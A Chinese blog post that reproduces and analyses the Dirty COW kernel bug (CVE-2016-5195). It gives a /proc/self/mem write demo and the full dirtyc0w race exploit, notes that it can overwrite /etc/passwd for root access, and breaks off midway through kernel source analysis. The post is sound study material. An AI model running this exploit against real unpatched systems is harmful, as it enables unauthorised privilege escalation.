

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="peiwithhao">
  <meta name="keywords" content="">
  
    <meta name="description" content="In fact, all the boring normal bugs are _way_ more important, just because there&#39;s a lot more of them. I don&#39;t think some spectacular security hole should be glorified or cared about as being any more">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2016-5195漏洞复现">
<meta property="og:url" content="https://peiandhao.github.io/2024/01/07/CVE-2016-5195/index.html">
<meta property="og:site_name" content="peiwithhao&#39;s Valhalla">
<meta property="og:description" content="In fact, all the boring normal bugs are _way_ more important, just because there&#39;s a lot more of them. I don&#39;t think some spectacular security hole should be glorified or cared about as being any more">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://peiandhao.github.io/img/CVE-2016-5195.jpg">
<meta property="article:published_time" content="2024-01-07T14:05:43.000Z">
<meta property="article:modified_time" content="2024-01-07T14:13:48.274Z">
<meta property="article:author" content="peiwithhao">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Kernel">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://peiandhao.github.io/img/CVE-2016-5195.jpg">
  
  
  
  <title>CVE-2016-5195漏洞复现 - peiwithhao&#39;s Valhalla</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"peiandhao.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"text"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Afm6UeM0VL6RfMOLAgwtyxs8-gzGzoHsz","app_key":"Vr60qrZIptqhJaXqWvDEknkH","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>p3ivv1+h@0</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/CVE-2016-5195.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2016-5195漏洞复现"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        peiwithhao
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-01-07 22:05" pubdate>
          2024年1月7日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          22k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          186 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">CVE-2016-5195漏洞复现</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Dirty-COW漏洞复现"><a href="#Dirty-COW漏洞复现" class="headerlink" title="Dirty COW漏洞复现"></a>Dirty COW漏洞复现</h1><h1 id="1-基础知识们"><a href="#1-基础知识们" class="headerlink" title="1.基础知识们"></a>1.基础知识们</h1><h2 id="proc-self-mem穿透"><a href="#proc-self-mem穿透" class="headerlink" title="/proc/self/mem穿透"></a><code>/proc/self/mem</code>穿透</h2><p>查看官方proc手册</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">/proc/pid/mem<br>              This file can be used to access the pages of a process<span class="hljs-string">&#x27;s memory through open(2), read(2), and lseek(2).</span><br><span class="hljs-string"></span><br><span class="hljs-string">              Permission to access this file is governed by a ptrace access mode PTRACE_MODE_ATTACH_FSCREDS check; see ptrace(2).</span><br></code></pre></td></tr></table></figure>

<p>可以看到说明是被用来访问进程的<strong>虚拟内存</strong>，我们可以通过常用的几个系统调用来进行访问，但这里注明一般需要有着高等级的权限，例如root用户(但是这里仅使用普通用户却仍然可以成功，因此我们在源码部分再进行详细解读)</p>
<p>这里存在一个神奇的点，那就是我们可以通过该文件系统来写入不可写的内存页面，考虑下面这个poc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;error.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">memwrite</span><span class="hljs-params">(<span class="hljs-type">char</span> *dst, <span class="hljs-type">char</span> *rsc, <span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-type">int</span> proc_mem;<br>    proc_mem = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span>(proc_mem &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;open mem failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(lseek(proc_mem, (<span class="hljs-type">size_t</span>)dst, SEEK_SET) == <span class="hljs-number">-1</span>)&#123;<br>        perror(<span class="hljs-string">&quot;lseek failed&quot;</span>);<br>        close(proc_mem);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(write(proc_mem, rsc, size) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;write failed&quot;</span>);<br>        close(proc_mem);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Successfully write to the mem %p\n&quot;</span>, dst);<br>    close(proc_mem);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;   <br>    <span class="hljs-type">size_t</span> *mymap;<br>    <span class="hljs-type">char</span> strange[] = <span class="hljs-string">&quot;\x41\x41\x41\x41&quot;</span>;<br>    <span class="hljs-type">char</span> interupt = <span class="hljs-string">&#x27;\xcc&#x27;</span>;<br>    mymap = (<span class="hljs-type">size_t</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x9000</span>, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(mymap &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;mmap mymap&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    memwrite((<span class="hljs-type">char</span> *)mymap, (charchuan tou *)strange, <span class="hljs-keyword">sizeof</span>(strange));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mymap content:%s\n&quot;</span>, mymap);<br>    getchar();<br>    memwrite((<span class="hljs-type">char</span> *)getchar, <span class="hljs-string">&quot;\xcc&quot;</span>, <span class="hljs-number">1</span>);<br>    getchar();<br><br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>这段代码极其简单，我们首先是通过mmap申请一个内存映射，可以看到我们将这段内存置为仅仅可读，然后我们尝试使用 <code>/proc/self/mem</code>函数向其中写入四个A字符，然后我们又尝试写入共享模块libc当中的函数页面，也就是getchar函数的地址，我们写入了一个 <code>\xcc</code>字符，而这个 <code>\xcc</code>实际上就是一个中断指令，如果我们修改成功，那么下一次调用getchar()内核将会捕获到一个中断信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">Boot took <span class="hljs-number">0.28</span> seconds<br><br>/ # ./poc <br>Successfully write to the mem <span class="hljs-number">0x7efd4b963000</span><br>mymap content:AAAA<br><br>Successfully write to the mem <span class="hljs-number">0x409fb0</span><br>Trace/breakpoint trap<br><br></code></pre></td></tr></table></figure>

<p>上面我们会发现，映射的只读地址却被成功写入，</p>
<hr>
<p>Question?</p>
<blockquote>
<p> 十分的奇怪，这里不禁思考，如果每个进程只要权限高点的话，那不是可以随意修改自己的进程空间了吗，那很有可能遭到各种损坏的呀</p>
</blockquote>
<hr>
<p>因特尔手册上面有交代设置控制内核访问内存的能力的标志</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Write <span class="hljs-title function_">Protect</span> <span class="hljs-params">(bit <span class="hljs-number">16</span> of CR0)</span> — When <span class="hljs-built_in">set</span>, inhibits supervisor-level procedures from writing into read- only pages; when clear, allows supervisor-level procedures to write into read-only <span class="hljs-title function_">pages</span> <span class="hljs-params">(regardless of the U/S bit setting; see Section <span class="hljs-number">4.1</span><span class="hljs-number">.3</span> and Section <span class="hljs-number">4.6</span>)</span>.<br></code></pre></td></tr></table></figure>

<p>也就是十分重要的cr0寄存器上面的第16位 <code>WP(Write Proctect)</code> ，若设置则不允许主管级进程写入用户态的只读页面，而若清除则允许，还有一个就是SMAP，我们常遇到的内核保护标志，这里主要是禁止内核读取或写入用户空间内存，常与他一起的是SMEP</p>
<p>接下来我们来看一下<code>/proc/self/mem</code>的实现，其位于 <code>fs/proc/base.c</code>当中</p>
<p>由于本次复现用到的是 linux-4.4.1的内核，理所当然是看该版本的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">proc_mem_operations</span> =</span> &#123;                       <br>     .llseek     = mem_lseek,<br>     .read       = mem_read,<br>     .write      = mem_write,<br>     .open       = mem_open,<br>     .release    = mem_release,<br> &#125;;  <br></code></pre></td></tr></table></figure>

<p>而其中的read&#x2F;write指针均指向的是 <code>mem_rw</code>函数</p>
<p>其中比较重要的是 <code>access_remote_vm</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">3649</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> __access_remote_vm(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-number">3650</span>         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)<br><span class="hljs-number">3651</span> &#123;<br><span class="hljs-number">3652</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br><span class="hljs-number">3653</span>     <span class="hljs-type">void</span> *old_buf = buf;<br>		 ...<br><span class="hljs-number">3661</span> <br><span class="hljs-number">3662</span>         ret = get_user_pages(tsk, mm, addr, <span class="hljs-number">1</span>,<br><span class="hljs-number">3663</span>                 write, <span class="hljs-number">1</span>, &amp;page, &amp;vma);<br><span class="hljs-number">3664</span>         <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-number">3665</span> <span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span><br><span class="hljs-number">3666</span>             <span class="hljs-keyword">break</span>;<br><span class="hljs-number">3667</span> <span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br></code></pre></td></tr></table></figure>

<p>这里发现大概在5.*版本之后 <code>get_user_pages</code>函数添加了一个wrapper <code>get_user_pages_remote</code>，但这两者区别并不是很大，这个是官方源码注释说的熬，并且据我观察 <code>get_uesr_pages_remote</code>的代码注释跟前面版本的 <code>get_user_pages</code>几乎一样～</p>
<p>这里不得不说一下<code>MMU</code>和<code>get_user_pages</code>的区别与相同之处，但可能并不完整:</p>
<p>相同：</p>
<ol>
<li>MMU与get_user_pages均是通过操作页表来将虚拟地址转换为物理地址</li>
</ol>
<p>不同：</p>
<ol>
<li>MMU是硬件实现，因此他会转而去检测一些硬件的东西，例如说我们的CR0寄存器的WP位</li>
<li>get_user_pages是内核的函数实现，他虽然说还是会通过页表遍历来获取物理地址，但并不会去检测cr0寄存器的取值，并且这在目前来看是有点合理的，毕竟内核没必要将用户态传入的虚拟地址再来通过MMU访问一次得到物理地址，他自身就有一个十分“安全”的解决方法</li>
</ol>
<p>然后内核再将获取到的物理地址通过 <code>kmap</code>函数映射到内核的虚拟地址空间，并且该虚拟地址空间是有着 <code>R/W</code>权限的，所以内核可以正常的读写该页面</p>
<p>因此 <code>/proc/slef/mem</code>就通过这种形式绕过了MMU对于地址的检测，写入了原本用户态定义为不可写的页面</p>
<p>very good               <img src="http://imgsrc.baidu.com/forum/pic/item/3801213fb80e7bec068ed1d4692eb9389b506bab.jpg" srcset="/img/loading.gif" lazyload></p>
<h1 id="2-Exploit分析"><a href="#2-Exploit分析" class="headerlink" title="2.Exploit分析"></a>2.Exploit分析</h1><p>这里我们直接给出利用的poc,然后依次分析函数的调用情况，该poc最终导致的结果是可以再只读的文件下写入值，这无疑是十分危险的，加入我们向 <code>/etc/passwd</code>文件写入一个root权限的用户，那么就会直接导致提权</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/71cf3bc79f3df8dc41a056a48b11728b47102862.jpg" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> *map;<br><span class="hljs-type">int</span> f;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">stat</span> st;<br><span class="hljs-type">char</span> *name;<br><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">madviseThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> </span>&#123;<br>  <span class="hljs-type">char</span> *str;<br>  str=(<span class="hljs-type">char</span>*)arg;<br>  <span class="hljs-type">int</span> i,c=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000000</span>;i++) &#123;<br>    c+=<span class="hljs-built_in">madvise</span>(map,<span class="hljs-number">100</span>,MADV_DONTNEED);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;madvise %d\n\n&quot;</span>,c);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">procselfmemThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span> </span>&#123;<br>  <span class="hljs-type">char</span> *str;<br>  str=(<span class="hljs-type">char</span>*)arg;<br>  <span class="hljs-type">int</span> f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>,O_RDWR);<br>  <span class="hljs-type">int</span> i,c=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000000</span>;i++) &#123;<br>    <span class="hljs-built_in">lseek</span>(f,map,SEEK_SET);<br>    c+=<span class="hljs-built_in">write</span>(f,str,<span class="hljs-built_in">strlen</span>(str));<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;procselfmem %d\n\n&quot;</span>, c);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (argc&lt;<span class="hljs-number">3</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-type">pthread_t</span> pth1,pth2;<br>  f=<span class="hljs-built_in">open</span>(argv[<span class="hljs-number">1</span>],O_RDONLY);<br>  <span class="hljs-built_in">fstat</span>(f,&amp;st);<br>  name=argv[<span class="hljs-number">1</span>];<br>  map=<span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mmap %x\n\n&quot;</span>,map);<br>  <span class="hljs-built_in">pthread_create</span>(&amp;pth1,<span class="hljs-literal">NULL</span>,madviseThread,argv[<span class="hljs-number">1</span>]);<br>  <span class="hljs-built_in">pthread_create</span>(&amp;pth2,<span class="hljs-literal">NULL</span>,procselfmemThread,argv[<span class="hljs-number">2</span>]);<br>  <span class="hljs-built_in">pthread_join</span>(pth1,<span class="hljs-literal">NULL</span>);<br>  <span class="hljs-built_in">pthread_join</span>(pth2,<span class="hljs-literal">NULL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>我们可以首先看到这里的main函数先打开了我们的 <code>victim file</code>，然后我们利用 <code>mmap</code>函数，这里是将内存中打开的文件映射到我们的用户虚拟地址空间，并且仅仅只有只读权限。</p>
<p>此时开启了两个线程 <code>madviseThread，procselfmemThread</code>,我们首先看第二个线程的实现</p>
<h2 id="第一次page-fault"><a href="#第一次page-fault" class="headerlink" title="第一次page fault"></a>第一次page fault</h2><p>这里他打开了 <code>/proc/self/mem</code>文件，也就是该用户程序的虚拟内存空间，然后不断尝试往映射到的 <code>victim file</code>区域写入我们的第二个参数的值</p>
<p>由于这里是写入的 <code>/proc/self/mem</code> ，因此首先调用的是 <code>mem_write</code>函数，但他实际上就是 <code>mem_rw</code>的wrapper，只是通过标识位区分他们,所以这里直接看 <code>mem_rw</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">write-&gt;mem_write-&gt;mem_rw<br>   <span class="hljs-comment">/* @file:将要写入的文件</span><br><span class="hljs-comment">    * @buf:用户希望写入的字符串</span><br><span class="hljs-comment">    * @count:写入的字节数</span><br><span class="hljs-comment">    * @ppos:即将写入的虚拟地址</span><br><span class="hljs-comment">    * @write:写标志位，这里通过mem_write函数可以看到直接传递的1值</span><br><span class="hljs-comment">   */</span><br><br><span class="hljs-number">847</span> <span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_rw</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">char</span> __user *buf,                                                                                                                              </span><br><span class="hljs-params"><span class="hljs-number">848</span>             <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *ppos, <span class="hljs-type">int</span> write)</span> 		<br>849 &#123;<br><span class="hljs-number">850</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> file-&gt;private_data;<br><span class="hljs-number">851</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = *ppos;<br><span class="hljs-number">852</span>     <span class="hljs-type">ssize_t</span> copied;<br><span class="hljs-number">853</span>     <span class="hljs-type">char</span> *page;<br>        ..............<br><span class="hljs-number">873</span> 		<br><span class="hljs-number">874</span>         this_len = access_remote_vm(mm, addr, page, this_len, write);<br><span class="hljs-number">875</span>         <span class="hljs-keyword">if</span> (!this_len) &#123;<br><span class="hljs-number">876</span>             <span class="hljs-keyword">if</span> (!copied)<br><span class="hljs-number">877</span>                 copied = -EIO;<br><span class="hljs-number">878</span>             <span class="hljs-keyword">break</span>;<br><span class="hljs-number">879</span>         &#125;<br></code></pre></td></tr></table></figure>

<p>其中访问用户的内存空间主要是依仗该函数 <code>access_remote_vm</code>,接着看</p>
